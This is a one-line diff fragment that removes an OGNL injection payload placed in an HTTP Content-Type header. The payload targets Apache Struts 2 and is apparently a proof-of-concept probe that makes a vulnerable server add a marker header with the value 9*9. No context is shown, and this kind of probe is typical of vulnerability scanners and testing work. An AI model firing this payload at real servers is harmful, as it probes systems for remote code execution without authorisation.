@@ -1,1 +1,0 @@
-Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack-RemoteCodeExecution-PoC',9*9)}.multipart/form-data
